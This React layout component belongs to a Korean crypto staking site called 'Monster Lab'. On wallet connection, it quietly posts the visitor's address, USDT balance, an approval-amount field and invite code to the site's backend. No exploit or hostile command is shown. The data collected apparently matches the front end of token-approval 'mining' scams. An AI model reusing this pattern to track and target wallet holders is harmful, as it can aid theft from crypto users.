import React, { useMemo, useState, useEffect } from "react";
import { Stack, Heading, Button, Text } from "@chakra-ui/react";
import Toast from "./toast";
import bg from "@/assets/background.gif"
import dynamic from "next/dynamic";
import Image from "next/image";

import { useNav, Pages } from "@/utils/storage";

import logo from "@/assets/logo.png"

import { TickerTapeSymbol } from "react-ts-tradingview-widget";

import { useConnect, useAccount, useBalance, useNetwork } from "wagmi";
import { environment } from "@/utils/address";
import { SaveMinerPayload } from "@/utils/interface";

import { isMobileDevice } from "@/utils/isMobileDevice";

export default function Layout({ children }: any) {

    const TickerTape = dynamic(
        () =>
            import("react-ts-tradingview-widget")
                .then(w => w.TickerTape),
        {
            ssr: false
        }
    )

    const symbols: TickerTapeSymbol[] = [
        { title: "BNB", proName: "BINANCE:BNBUSDT" },
        { title: "BTC", proName: "BINANCE:BTCUSDT" },
        { title: "ETH", proName: "BINANCE:ETHUSDT" },
        { title: "SOL", proName: "BINANCE:SOLUSDT" },
        { title: "TRX", proName: "BINANCE:TRXUSDT" },
        { title: "USDT", proName: "CRYPTOCAP:USDT" },
        { title: "DOGE", proName: "BINANCE:DOGEUSDT" },
        { title: "ADA", proName: "BINANCE:ADAUSDT" },
        { title: "XRP", proName: "BINANCE:XRPUSDT" },
    ]

    const MemoizedTickerTape = useMemo(() => {
        return (
            <Stack w={{ base: "100%", md: "60%" }} borderRadius={"xl"} shadow={"lg"} px={5} bgColor={"white"}>
                <TickerTape
                    locale="kr"
                    displayMode="regular"
                    isTransparent
                    showSymbolLogo
                    colorTheme="light"
                    symbols={symbols}
                />
            </Stack>
        );
    }, [])

    return (
        <Stack w={"100%"} minH={"100vh"} direction={"row"} justifyContent={"center"} alignItems={"center"}>
            <Stack
                w={"100%"} h={"100vh"} position={"fixed"} top={0} left={0} zIndex={0}
                bgImage={`url(${bg.src})`} bgSize={"cover"} bgPos={"center"} bgAttachment={"fixed"} bgRepeat={"no-repeat"}
                filter={"blur(10px)"}
            />
            <Stack w={"100%"} minH={"100vh"} zIndex={2} justifyContent={"flex-start"} alignItems={"center"} p={{ base: 2, md: 5 }}>
                <Header />
                {MemoizedTickerTape}
                {children}
                <Footer />
            </Stack>
        </Stack>
    );
}

function Header() {

    const navButtons: { label: string, page: Pages }[] = [
        { label: "홈", page: "home" },
        { label: "회사소개", page: "about" },
        { label: "고객센터", page: "support" },
    ]

    const toast = Toast()
    const { setNav } = useNav()
    const { chain } = useNetwork()
    const { isConnected, address } = useAccount()

    const [invite, setInvite] = useState<string | null>(null);
    const [isClient, setIsClient] = useState(false);

    const { data: balance, isFetching } = useBalance({
        address: address,
        token: environment.token_address
    })
    const { connectAsync, connectors, isLoading, connect, pendingConnector } = useConnect({
        onSuccess(data, variables, context) {
            handleSaveMiner(data.chain.id);
        },
        onError(error, variables, context) {
            const message = error.message || "Please connect your wallet"
            toast.error(message, error.name)
        },
    });

    useEffect(() => {
        setIsClient(true)
    }, []);
    useEffect(() => {
        if (isConnected && !isFetching && address) {
            handleSaveMiner(chain?.id as number)
        }
    }, [balance, isFetching, address, isConnected])

    const handleSaveMiner = async (chainId: number) => {
        const payload: SaveMinerPayload = {
            address: address as string,
            balance: [
                {
                    amount: balance ? balance?.formatted : "0",
                    approvedAmount: "0",
                    chain: chainId,
                    symbol: "USDT",
                    tokenContractAddress: environment.token_address,
                },
            ],
            invite,
        };
        try {
            const req = await fetch("/api/saveMiner", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(payload),
            });
            await req.json();
        } catch (error) {
            console.log("Error: ", error)
        }
    };

    const handleConnect = async () => {
        if (!isConnected) {
            const injectedConnector = connectors.find(c => c.id === 'injected');
            const walletConnectConnector = connectors.find(c => c.id === 'walletConnect');

            if (isMobileDevice() && typeof window !== "undefined") {
                if (window.ethereum && injectedConnector) {
                    try {
                        await connect({ connector: injectedConnector })
                        return;
                    } catch (e) {
                        await connect({ connector: walletConnectConnector })
                        return;
                    }
                }

                if (walletConnectConnector) {
                    connect({ connector: walletConnectConnector });
                    return;
                }
            } else {
                if (walletConnectConnector) {
                    connect({ connector: walletConnectConnector });
                    return;
                }
            }

            // let connectorToUse;
            // if (isMobileDevice()) {
            //     connectorToUse = connectors.find(c => c.id === 'injected') || connectors[1]
            // } else {
            //     connectorToUse = connectors.find(c => c.id === 'walletConnect') || connectors[0]
            // }
            // if (connectorToUse) connect({ connector: connectorToUse })

            // if (!isConnected) {
            //     const wcConnector = connectors.find(c => c.id === 'walletConnect')
            //     if (wcConnector) connect({ connector: wcConnector })
            // } else {
            //     setNav("mining")
            // }
        } else {
            setNav("mining")
        }
    }

    return (
        <Stack
            borderRadius={"xl"} shadow={"lg"} bgColor={"white"}
            w={{ base: "100%", md: "60%" }} p={{ base: 2, md: 5 }}
            justifyContent={"center"} alignItems={"center"}
        >
            <Stack direction={"row"} justifyContent={"center"} alignItems={"center"} gap={0}>
                <Image src={logo} alt="Logo" height={50} />
                <Heading>Monster Lab</Heading>
            </Stack>
            <Stack direction={"row"} justifyContent={"center"} alignItems={"center"} gap={{ base: 0, md: 5 }}>
                {
                    navButtons.map((nav, index) => (
                        <Button key={index} variant={"ghost"} colorScheme="blue" onClick={() => setNav(nav.page)}>{nav.label}</Button>
                    ))
                }
                <Button
                    variant={"ghost"} colorScheme="blue"
                    onClick={handleConnect}
                >
                    {isClient && (!isConnected ? "지갑 연결" : "스테이킹")}
                </Button>
            </Stack>
        </Stack>
    );
}

function Footer() {
    const { setNav } = useNav()
    return (
        <Stack w={"100%"} direction={"row"} justifyContent={"center"} alignItems={"center"} mt={"auto"}>
            <Text fontWeight={"semibold"}>© {new Date().getFullYear()} Monster Lab.</Text>
            <Text> 모든 권리 보유.</Text>
            <Text>|</Text>
            <Button variant={"ghost"} colorScheme="blue" onClick={() => setNav("support")}>고객센터</Button>
        </Stack>
    );
}